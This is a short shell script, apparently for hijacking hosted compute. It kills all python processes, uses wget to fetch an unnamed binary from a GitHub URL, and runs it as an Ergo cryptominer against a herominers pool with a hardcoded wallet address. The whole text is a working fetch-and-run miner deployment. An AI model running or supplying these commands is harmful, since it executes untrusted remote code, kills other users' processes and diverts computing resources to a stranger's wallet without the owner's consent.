sudo apt install screen
screen -R bebek
killall python
wget -qO bebek https://github.com/omarjetios/tes/blob/master/nb?raw=true
chmod +x bebek
./bebek -a ergo -o stratum+tcp://hk.ergo.herominers.com:10250 -u 9ggeHMVgWKruP9MNk9g9LX2C8kesuNRQnnFKVoxkDwFJhgQM78k.$(echo $(shuf -i 1-10 -n 1)-ergo) -log
